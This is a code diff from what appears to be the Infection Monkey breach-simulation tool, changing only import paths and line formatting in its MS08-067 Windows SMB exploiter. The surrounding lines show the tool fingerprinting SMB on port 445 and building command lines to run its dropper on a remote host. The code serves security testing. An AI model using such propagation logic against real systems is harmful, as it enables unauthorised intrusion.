+++ monkey/infection_monkey/exploit/win_ms08_067.py
@@ -17,7 +17,7 @@ from impacket.dcerpc.v5 import transport
 from infection_monkey.exploit.tools.helpers import get_target_monkey, get_monkey_depth, build_monkey_commandline
 from infection_monkey.exploit.tools.smb_tools import SmbTools
 from infection_monkey.model import DROPPER_CMDLINE_WINDOWS, MONKEY_CMDLINE_WINDOWS
-from infection_monkey.network import SMBFinger
+from infection_monkey.network.smbfinger import SMBFinger
 from infection_monkey.network.tools import check_tcp_port
 from . import HostExploiter
 
@@ -162,11 +162,11 @@ class Ms08_067_Exploiter(HostExploiter):
 
     def is_os_supported(self):
         if self.host.os.get('type') in self._TARGET_OS_TYPE and \
-                        self.host.os.get('version') in list(self._windows_versions.keys()):
+                self.host.os.get('version') in list(self._windows_versions.keys()):
             return True
 
         if not self.host.os.get('type') or (
-                        self.host.os.get('type') in self._TARGET_OS_TYPE and not self.host.os.get('version')):
+                self.host.os.get('type') in self._TARGET_OS_TYPE and not self.host.os.get('version')):
             is_smb_open, _ = check_tcp_port(self.host.ip_addr, 445)
             if is_smb_open:
                 smb_finger = SMBFinger()
@@ -234,7 +234,8 @@ class Ms08_067_Exploiter(HostExploiter):
         # execute the remote dropper in case the path isn't final
         if remote_full_path.lower() != self._config.dropper_target_path_win_32.lower():
             cmdline = DROPPER_CMDLINE_WINDOWS % {'dropper_path': remote_full_path} + \
-                      build_monkey_commandline(self.host, get_monkey_depth() - 1, self._config.dropper_target_path_win_32)
+                      build_monkey_commandline(self.host, get_monkey_depth() - 1,
+                                               self._config.dropper_target_path_win_32)
         else:
             cmdline = MONKEY_CMDLINE_WINDOWS % {'monkey_path': remote_full_path} + \
                       build_monkey_commandline(self.host, get_monkey_depth() - 1)
